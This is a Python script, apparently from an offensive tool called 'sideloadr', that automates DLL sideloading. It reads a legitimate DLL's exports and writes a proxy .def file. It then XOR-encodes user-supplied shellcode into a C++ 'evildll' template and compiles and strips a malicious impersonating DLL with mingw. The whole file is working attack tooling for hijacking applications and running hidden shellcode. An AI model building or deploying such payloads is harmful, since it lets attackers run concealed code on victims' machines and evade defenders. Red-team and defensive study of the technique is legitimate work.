#!/usr/bin/env python3

import argparse
import shutil
import os
import subprocess
import pefile
import jinja2
from sideloadr.constants import *

def get_module(dll):
    if ".dll" not in dll.lower():
        return ""
    return dll.split("/")[-1].split(".")[0]

def build_def(pe, victim_dll, new_name="tmp.dll", outdir="out"):
    module = get_module(victim_dll)
    new_module = get_module(new_name)
    with open(f"{outdir}/{module}.def", "w") as fp:
        fp.write("EXPORTS\n")
        for export in pe.DIRECTORY_ENTRY_EXPORT.symbols: 
            fp.write(
                f"{export.name.decode('UTF-8')}={new_module}.{export.name.decode('UTF-8')} @{export.ordinal}\n"
            )

def build_payload(victim_dll, payload, outdir="out", key="0xfa"):
    module = get_module(victim_dll)
    env = jinja2.Environment()
    template = env.from_string(evildll)
    with open(payload, "rb") as fp:
        data = fp.read()
    pay = "".join(f"\\x{hex(b ^ key)[2:].rjust(2,'0')}" for b in data)
    rendered = template.render(pSa=pay)
    with open(f"{outdir}/{module}.cpp", "w") as fp:
        fp.write(rendered)

def compile_payload(victim_dll, new_name, outdir="out", x86=False):
    module = get_module(victim_dll)
    new_module = get_module(new_name)
    shutil.copy(victim_dll, f"{outdir}/{new_module}.dll")
    if x86:
        command = f"i686-w64-mingw32-g++ -shared -s -O3 -o {outdir}/{module}.dll {outdir}/{module}.cpp {outdir}/{module}.def"
    else:
        command = f"x86_64-w64-mingw32-g++ -shared -s -O3 -o {outdir}/{module}.dll {outdir}/{module}.cpp {outdir}/{module}.def"
    pid = subprocess.Popen(command.split())
    pid.wait()

    # Strip symbols
    strip_command = f"strip --strip-unneeded {outdir}/{module}.dll"
    subprocess.run(strip_command.split())

def clean_build_files(victim_dll, out_dir, CLEAN=True):
    module = get_module(victim_dll)
    if CLEAN:
        os.remove(f"{out_dir}/{module}.cpp")
        os.remove(f"{out_dir}/{module}.def")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("victim", help="Path to the DLL we want to impersonate.")
    parser.add_argument("payload", help="Path to the shellcode we want to execute.")
    parser.add_argument("proxy", help="What we want to rename the victim DLL to for proxying.", default="tmp.dll")
    parser.add_argument("outdir", help="The output directory for all artifacts.")
    parser.add_argument("key", help="The key to xor the shellcode with.", default="0xfa")
    parser.add_argument("--no-clean", help="Do not clean the build folder. Keep cpp and def file.", action='store_false')
    parser.add_argument("--x86", help="Set when you want to compile 32-bit instead of the default 64-bit.", action='store_true')
    args = parser.parse_args()

    victim = os.path.abspath(args.victim)
    payload = os.path.abspath(args.payload)
    out_dir = os.path.abspath(args.outdir)

    shutil.rmtree(f"{out_dir}", ignore_errors=True)
    os.makedirs(f"{out_dir}", exist_ok=True)

    pe = pefile.PE(victim)
    
    build_def(pe, victim, args.proxy, out_dir)
    build_payload(victim, payload, out_dir, int(args.key, 16))
    compile_payload(victim, args.proxy, out_dir, x86=args.x86)
    clean_build_files(victim, out_dir, CLEAN=args.no_clean)

if __name__== "__main__":
    main()
